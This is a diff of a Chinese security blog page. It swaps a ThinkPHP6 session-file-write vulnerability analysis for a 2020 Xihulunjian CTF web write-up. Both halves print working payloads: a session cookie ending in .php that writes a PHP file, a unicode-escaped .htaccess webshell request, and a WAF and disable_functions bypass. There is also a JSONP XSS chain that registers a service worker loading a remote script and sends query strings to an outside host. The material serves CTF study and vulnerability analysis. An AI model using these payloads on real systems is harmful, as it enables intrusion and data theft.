@@ -4,22 +4,25 @@
   <meta charset="utf-8">
   
   
-  <title>ThinkPHP6 任意文件操作漏洞分析 | oxcccccc</title>
+  <title>2020西湖论剑 | oxcccccc</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="ThinkPHP6 任意文件操作漏洞分析利用条件 ThinkPHP6.0.0-6.0.1 开启Sessoin中间件  漏洞复现官方commit: https:&#x2F;&#x2F;github.com&#x2F;top-think&#x2F;framework&#x2F;commit&#x2F;1bbe75019ce6c8e0101a6ef73706217e406439f2  复现环境为:phpstudy+thinkphp6.0.1 \app\contr">
+  <meta name="description" content="西湖论剑NewUploadhint:我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。看看宝塔自己装的 apache 有什么东西？ %00干掉宝塔waf 任意文件上传过滤php关键字上传.htaccess绕过普通的payload并不适用与php-fpm通信在&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;apache下发现php的解析方式  #PHP     &lt;F">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP6 任意文件操作漏洞分析">
-<meta property="og:url" content="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="2020西湖论剑">
+<meta property="og:url" content="http://blog.ccreater.top/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
 <meta property="og:site_name" content="oxcccccc">
-<meta property="og:description" content="ThinkPHP6 任意文件操作漏洞分析利用条件 ThinkPHP6.0.0-6.0.1 开启Sessoin中间件  漏洞复现官方commit: https:&#x2F;&#x2F;github.com&#x2F;top-think&#x2F;framework&#x2F;commit&#x2F;1bbe75019ce6c8e0101a6ef73706217e406439f2  复现环境为:phpstudy+thinkphp6.0.1 \app\contr">
+<meta property="og:description" content="西湖论剑NewUploadhint:我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。看看宝塔自己装的 apache 有什么东西？ %00干掉宝塔waf 任意文件上传过滤php关键字上传.htaccess绕过普通的payload并不适用与php-fpm通信在&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;apache下发现php的解析方式  #PHP     &lt;F">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png">
-<meta property="article:published_time" content="2020-02-01T09:08:34.153Z">
-<meta property="article:modified_time" content="2020-02-01T09:08:34.153Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png">
+<meta property="article:published_time" content="2020-10-15T14:30:27.400Z">
+<meta property="article:modified_time" content="2020-10-15T14:30:27.400Z">
 <meta property="article:author" content="ccreater">
-<meta property="article:tag" content="cve复现">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png">
   
     <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
   
@@ -71,14 +74,14 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-2020西湖论剑" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
-  <time class="dt-published" datetime="2020-02-01T09:08:34.153Z" itemprop="datePublished">2020-02-01</time>
+    <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" class="article-date">
+  <time class="dt-published" datetime="2020-10-15T14:30:27.400Z" itemprop="datePublished">2020-10-15</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
   </div>
 
   </div>
@@ -89,7 +92,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      ThinkPHP6 任意文件操作漏洞分析
+      2020西湖论剑
     </h1>
   
 
@@ -97,147 +100,130 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
-<li>ThinkPHP6.0.0-6.0.1</li>
-<li>开启Sessoin中间件</li>
-</ol>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
-<p>复现环境为:phpstudy+thinkphp6.0.1</p>
-<p><code>\app\controller\index.php</code>:</p>
-<pre><code class="php">&lt;?php
-namespace app\controller;
+        <h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>hint:<br>我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。<br>看看宝塔自己装的 apache 有什么东西？</p>
+<p>%00干掉宝塔waf</p>
+<p>任意文件上传过滤php关键字<br>上传.htaccess绕过<br>普通的payload并不适用与php-fpm通信<br>在<code>/www/server/panel/vhost/apache</code>下发现php的解析方式</p>
+<pre><code> #PHP
+    &lt;FilesMatch \.php$&gt;
+            SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;
+    &lt;/FilesMatch&gt;</code></pre><p>直接设置<code>SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;</code>，访问我们上传的后门并不行，查了下资料发现php-fpm有security.limit_extensions限制了php脚本的后缀名，它的默认值是:<code>.php .phar</code></p>
+<p>所以我们上传phar文件getshell,getshell后发现，我们需要readflag而，命令执行函数都被干掉了，php版本是php 7.4.10</p>
+<pre><code>passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</code></pre><p>把<a href="https://github.com/Explorersss/exploits中的脚本试过一边后都不行" target="_blank" rel="noopener">https://github.com/Explorersss/exploits中的脚本试过一边后都不行</a></p>
+<p>但是这里php-fpm服务是通过socket文件通信的，我们可以直接打php-fpm绕过disable function</p>
+<p><a href="https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php" target="_blank" rel="noopener">https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php</a></p>
+<h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><pre><code class="php">&lt;?php
+include &#39;security.php&#39;;
 
-use app\BaseController;
-use think\facade\Session;
-class Index extends BaseController
-{
-    public function index($name)
-    {
-        Session::set(&#39;name&#39;, $name);
-        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
-    }
+if(!isset($_GET[&#39;source&#39;])){
+    show_source(__FILE__);
+    die();
+}
+$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
+}
+$action = $_GET[&#39;action&#39;];
+$content = file_get_contents(&quot;php://input&quot;);
 
-}</code></pre>
-<p><code>\app\middleware.php</code></p>
-<pre><code class="php">&lt;?php
-// 全局中间件定义文件
-return [
-    // 全局请求缓存
-    // \think\middleware\CheckRequestCache::class,
-    // 多语言加载
-    // \think\middleware\LoadLangPack::class,
-//     Session初始化
-     \think\middleware\SessionInit::class
-];</code></pre>
-<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
-<pre><code class="php">public function save(): void
-    {
-        $this-&gt;clearFlashData();//清除原来的数据
 
-        $sessionId = $this-&gt;getId();
-
-        if (!empty($this-&gt;data)) {
-            $data = $this-&gt;serialize($this-&gt;data);
-
-            $this-&gt;handler-&gt;write($sessionId, $data);
-        } else {
-            $this-&gt;handler-&gt;delete($sessionId);
-        }
-
-        $this-&gt;init = false;
-    }</code></pre>
-<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
-<pre><code class="php">public function write(string $sessID, string $sessData): bool
-    {
-        $filename = $this-&gt;getFileName($sessID, true);
-        $data     = $sessData;
-
-        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
-            //数据压缩
-            $data = gzcompress($data, 3);
-        }
-
-        return $this-&gt;writeFile($filename, $data);
-    }</code></pre>
-<p>再跟进<code>$this-&gt;writeFile</code></p>
-<pre><code class="php">protected function writeFile($path, $content): bool
-    {
-        return (bool) file_put_contents($path, $content, LOCK_EX);
-    }</code></pre>
-<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
-<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
-<p>跟进去</p>
-<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
-    {
-        if ($this-&gt;config[&#39;prefix&#39;]) {
-            // 使用子目录
-            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
-        } else {
-            $name = &#39;sess_&#39; . $name;
-        }
-
-        $filename = $this-&gt;config[&#39;path&#39;] . $name;
-        $dir      = dirname($filename);
-
-        if ($auto &amp;&amp; !is_dir($dir)) {
-            try {
-                mkdir($dir, 0755, true);
-            } catch (\Exception $e) {
-                // 创建失败
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
             }
         }
-
-        return $filename;
-    }</code></pre>
-<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
-<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
-<pre><code class="php">    public function getId(): string
-    {
-        return $this-&gt;id;
-    }</code></pre>
-<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
-<pre><code class="php">    public function setId($id = null): void
-    {
-        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
-    }</code></pre>
-<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
-<p>查找调用setId的函数</p>
-<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
-<p>其中<code>SessionInit</code></p>
-<pre><code class="php">    public function handle($request, Closure $next)
-    {
-        // Session初始化
-        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
-        $cookieName   = $this-&gt;session-&gt;getName();
-
-        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
-            $sessionId = $request-&gt;request($varSessionId);
-        } else {
-            $sessionId = $request-&gt;cookie($cookieName);
-        }
-
-        if ($sessionId) {
-            $this-&gt;session-&gt;setId($sessionId);
-        }
-    }</code></pre>
-<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
-<p>因此构造payload</p>
-<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E
-
-Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php
-
-访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
-{
-    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
+    }
+}
+else{
+    die(&#39;Security Check Failed.&#39;);
 }</code></pre>
-<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+<pre><code>POST /?source=1&amp;action=write&amp;filename=index.php HTTP/1.1
+Host: easyjson.xhlj.wetolink.com
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 439
+
+{&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;}</code></pre><p>flag{a5db5397505f825334aa4dfc17d3bb9f}</p>
+<h2 id="hardxss"><a href="#hardxss" class="headerlink" title="hardxss"></a>hardxss</h2><p>在登入接口发现如下代码：</p>
+<pre><code class="javascript">callback = &quot;get_user_login_status&quot;;
+        auto_reg_var();
+        if(typeof(jump_url) == &quot;undefined&quot; || /^\//.test(jump_url)){
+            jump_url = &quot;/&quot;;
+        }
+        jsonp(&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot; + callback,function(result){
+            if(result[&#39;status&#39;]){
+                location.href = jump_url;
+            }
+        })
+        function jsonp(url, success) {
+            var script = document.createElement(&quot;script&quot;);
+            if(url.indexOf(&quot;callback&quot;) &lt; 0){
+                var funName = &#39;callback_&#39; + Date.now() + Math.random().toString().substr(2, 5);
+                url = url + &quot;?&quot; + &quot;callback=&quot; + funName;
+            }else{
+                var funName = callback;
+            }
+            window[funName] = function(data) {
+                success(data);
+                delete window[funName];
+                document.body.removeChild(script);
+            }
+            script.src = url;
+            document.body.appendChild(script);
+        }
+        function auto_reg_var(){
+            var search = location.search.slice(1);
+            var search_arr = search.split(&#39;&amp;&#39;);
+            for(var i = 0;i &lt; search_arr.length; i++){
+                [key,value] = search_arr[i].split(&quot;=&quot;);
+                window[key] = value;
+            }
+        }</code></pre>
+<p>利用jsonp任意xss</p>
+<p>view-source:<a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)</a>;</p>
+<p>利用Service Workers从xss.hardxss.xhlj.wetolink.com移动到auth.hardxss.xhlj.wetolink.com</p>
+<p><a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//</a></p>
+<p>2:</p>
+<pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;
+a=document.createElement(&quot;iframe&quot;);
+a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;
+document.body.append(a);
+document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
+function fuck(){
+    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;
+    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
+}
+</code></pre>
+<p>/:</p>
+<pre><code class="javascript">self.addEventListener(&#39;fetch&#39;, function(event) {
+  event.respondWith(new Response(&#39;&lt;html&gt;&lt;script&gt;document.location.href=&quot;http://ccreater.top:60000/?&quot;+document.location.search&lt;/script&gt;&lt;/html&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
+});</code></pre>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png" alt="image5725"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png" alt="image5832"></p>
+<p>详细说明见：<a href="http://blog.ccreater.top/2020/10/15/Service%20Worker/">http://blog.ccreater.top/2020/10/15/Service%20Worker/</a></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/15/2020西湖论剑/">http://blog.ccreater.top/2020/10/15/2020西湖论剑/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cka3ckr2c0011v4v08z7p73pm" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
+      <a data-url="http://blog.ccreater.top/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-id="ckgax7ax500002cvd54308h68" data-title="2020西湖论剑" class="article-share-link">Share</a>
       
 	  
 			  
@@ -261,7 +247,7 @@ Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php
 	  
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
 
     </footer>
   </div>
@@ -269,19 +255,10 @@ Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php
     
 <nav id="article-nav">
   
-    <a href="/2020/02/07/2020hgame/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          2020hgame
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2020/10/15/Service%20Worker/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">ThinkPHP框架5.0.x_SQL注入分析</div>
+      <div class="article-nav-title">Service Worker</div>
     </a>
   
 </nav>
